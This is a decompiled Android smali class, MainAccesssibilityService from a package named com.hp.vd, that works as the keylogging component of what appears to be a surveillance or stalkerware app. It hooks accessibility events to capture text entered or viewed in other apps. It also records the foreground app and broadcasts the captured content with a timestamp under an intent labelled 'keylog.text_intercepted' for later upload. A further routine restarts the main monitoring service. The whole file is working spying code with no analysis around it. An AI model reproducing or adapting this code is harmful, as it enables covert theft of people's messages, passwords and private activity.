.class public Lcom/hp/vd/MainAccesssibilityService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "MainAccesssibilityService.java"


# instance fields
.field protected final MAX_CONTENT_LENGTH:I

.field protected lastContent:Ljava/lang/String;

.field protected lastDate:J

.field protected lastPackageName:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    .line 14
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const/high16 v0, 0x10000

    .line 16
    iput v0, p0, Lcom/hp/vd/MainAccesssibilityService;->MAX_CONTENT_LENGTH:I

    const-string v0, ""

    .line 17
    iput-object v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastPackageName:Ljava/lang/String;

    const-string v0, ""

    .line 18
    iput-object v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    const-wide/16 v0, 0x0

    .line 19
    iput-wide v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastDate:J

    return-void
.end method


# virtual methods
.method protected broadcast(Ljava/lang/String;Ljava/lang/String;J)V
    .locals 2

    .line 147
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "com.hp.vb.intent.keylog.text_intercepted"

    .line 148
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "package_name"

    .line 150
    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string p1, "content"

    .line 151
    invoke-virtual {v0, p1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string p1, "date"

    .line 152
    invoke-virtual {v0, p1, p3, p4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;J)Landroid/content/Intent;

    .line 156
    invoke-virtual {p0}, Lcom/hp/vd/MainAccesssibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method protected clipboardHandle(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2

    .line 49
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x20

    if-ne v0, v1, :cond_0

    .line 50
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 53
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/ServiceMain;->lastForegroundPackageName:Ljava/lang/String;

    .line 54
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "foreground package: "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcom/hp/vd/ServiceMain;->lastForegroundPackageName:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method protected extractText(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    if-eqz p1, :cond_2

    .line 23
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    .line 27
    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x2

    if-gt v0, v1, :cond_1

    return-object p1

    .line 31
    :cond_1
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x1

    sub-int/2addr v0, v1

    invoke-virtual {p1, v1, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    return-object p1

    :cond_2
    :goto_0
    const/4 p1, 0x0

    return-object p1
.end method

.method protected handleEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 4

    .line 61
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_8

    .line 63
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    move-result v1

    if-nez v1, :cond_0

    goto/16 :goto_1

    .line 69
    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/4 v2, 0x1

    if-ne v1, v2, :cond_3

    .line 70
    iget-object p1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    if-eqz p1, :cond_2

    iget-object p1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    if-nez p1, :cond_1

    goto :goto_0

    .line 76
    :cond_1
    invoke-virtual {p0}, Lcom/hp/vd/MainAccesssibilityService;->process()V

    return-void

    :cond_2
    :goto_0
    const-string p1, "Skipping upload as content is NULL or 0"

    .line 71
    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    return-void

    .line 81
    :cond_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/16 v2, 0x10

    const/high16 v3, 0x10000

    if-ne v1, v2, :cond_5

    .line 89
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->extractText(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 91
    iget-object v1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    .line 92
    invoke-virtual {p0}, Lcom/hp/vd/MainAccesssibilityService;->process()V

    .line 95
    :cond_4
    invoke-virtual {p0, p1, v3}, Lcom/hp/vd/MainAccesssibilityService;->limit(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    .line 96
    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastPackageName:Ljava/lang/String;

    .line 97
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastDate:J

    return-void

    .line 102
    :cond_5
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/16 v2, 0x2000

    if-ne v1, v2, :cond_7

    .line 110
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->extractText(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 112
    iget-object v1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_6

    .line 113
    invoke-virtual {p0}, Lcom/hp/vd/MainAccesssibilityService;->process()V

    .line 116
    :cond_6
    invoke-virtual {p0, p1, v3}, Lcom/hp/vd/MainAccesssibilityService;->limit(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    .line 117
    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastPackageName:Ljava/lang/String;

    .line 118
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastDate:J

    return-void

    :cond_7
    return-void

    :cond_8
    :goto_1
    const-string p1, "packageName == null || .length == 0"

    .line 64
    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    return-void
.end method

.method protected limit(Ljava/lang/String;I)Ljava/lang/String;
    .locals 1

    .line 126
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-gt v0, p2, :cond_0

    return-object p1

    :cond_0
    const/4 v0, 0x0

    .line 130
    invoke-virtual {p1, v0, p2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected log(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0

    .line 38
    :try_start_0
    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->handleEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    .line 41
    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->clipboardHandle(Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-string p1, "onAccessibilityEvent(): Exception caught while handling event"

    .line 43
    invoke-virtual {p0, p1}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    :goto_0
    return-void
.end method

.method public onInterrupt()V
    .locals 1

    const-string v0, "onInterrupt(): finished"

    .line 162
    invoke-virtual {p0, v0}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    return-void
.end method

.method public onServiceConnected()V
    .locals 3

    .line 168
    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    .line 171
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/MainAccesssibilityService;->startServiceIfNeeded()V

    .line 173
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "com.hp.vb.intent.keylog.state_change"

    .line 174
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "status"

    const/4 v2, 0x1

    .line 176
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 178
    invoke-virtual {p0}, Lcom/hp/vd/MainAccesssibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-string v0, "onServiceConnected(): exception caught"

    .line 181
    invoke-virtual {p0, v0}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    :goto_0
    const-string v0, "onServiceConnected(): finished"

    .line 184
    invoke-virtual {p0, v0}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    return-void
.end method

.method protected process()V
    .locals 4

    .line 135
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "process(): content: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ", package: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastPackageName:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    .line 138
    iget-object v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastPackageName:Ljava/lang/String;

    iget-object v1, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    iget-wide v2, p0, Lcom/hp/vd/MainAccesssibilityService;->lastDate:J

    invoke-virtual {p0, v0, v1, v2, v3}, Lcom/hp/vd/MainAccesssibilityService;->broadcast(Ljava/lang/String;Ljava/lang/String;J)V

    const-string v0, ""

    .line 140
    iput-object v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastPackageName:Ljava/lang/String;

    const-string v0, ""

    .line 141
    iput-object v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastContent:Ljava/lang/String;

    const-wide/16 v0, 0x0

    .line 142
    iput-wide v0, p0, Lcom/hp/vd/MainAccesssibilityService;->lastDate:J

    return-void
.end method

.method protected startServiceIfNeeded()V
    .locals 3

    .line 189
    invoke-static {p0}, Lcom/hp/vd/agent/InstallHelper;->isInstalledCompletely(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "app is not yet installed. We will not start the service (backup)"

    .line 190
    invoke-virtual {p0, v0}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    return-void

    .line 195
    :cond_0
    const-class v0, Lcom/hp/vd/ServiceMain;

    invoke-static {p0, v0}, Lcom/hp/vd/agent/InstallHelper;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "service is running. It won\'t be started again."

    .line 196
    invoke-virtual {p0, v0}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    return-void

    :cond_1
    const-string v0, "service is NOT running. Backup starting with an immediate alarm"

    .line 201
    invoke-virtual {p0, v0}, Lcom/hp/vd/MainAccesssibilityService;->log(Ljava/lang/String;)V

    .line 203
    new-instance v0, Lcom/hp/vd/AlarmRoutine;

    const/4 v1, 0x0

    new-instance v2, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v2}, Lcom/hp/vd/agent/Configuration;-><init>()V

    invoke-direct {v0, p0, v1, v2}, Lcom/hp/vd/AlarmRoutine;-><init>(Landroid/content/Context;Landroid/content/Intent;Lcom/hp/vd/agent/Configuration;)V

    .line 209
    invoke-virtual {v0}, Lcom/hp/vd/AlarmRoutine;->dispatchOnBoot()V

    return-void
.end method
